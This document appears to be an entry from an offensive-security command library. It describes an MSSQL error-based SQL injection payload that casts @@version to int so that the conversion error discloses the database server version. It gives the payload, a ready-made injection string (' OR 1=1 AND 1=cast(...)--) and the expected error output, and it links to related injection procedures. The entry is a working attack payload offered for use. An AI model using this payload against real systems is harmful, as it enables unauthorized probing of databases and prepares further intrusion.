---
id: b9484813-3acb-45e6-8a6b-471f166264e7
name: cast-int-@@version
type: command
executor: sql
data: cast((SELECT @@version) as int)
output: null
created_at: '2023-04-06T03:56:33.815888+00:00'
updated_at: '2023-04-10T20:22:41.312777+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - sql-injection
  - error-based
verified: true
validated: true
---

# cast-int-@@version

## Command

```sql
cast((SELECT @@version) as int)
```

## Description

This SQL command casts the result of selecting the @@version variable to an integer, triggering a conversion error that exposes the server version in the error text. Equivalent to CONVERT but uses CAST syntax; ideal for error-based SQLi in subquery contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @@version | MSSQL system variable for server version | Yes (built-in) |
| int | Target data type | Yes (built-in) |

## Examples

### Basic Usage

Direct execution:

```sql
SELECT cast((SELECT @@version) as int)
```

### In Injection

For vulnerable SELECT:

```sql
' OR 1=1 AND 1=cast((SELECT @@version) as int)--
```

## Expected Output

Error: "Error converting data type varchar to int. Microsoft SQL Server 2019..." Version details in the error description.

## Related

- [[procedures/MSSQL-Error-Based-Injection-to-Extract-Version]]
- [[commands/convert-int-@@version]]
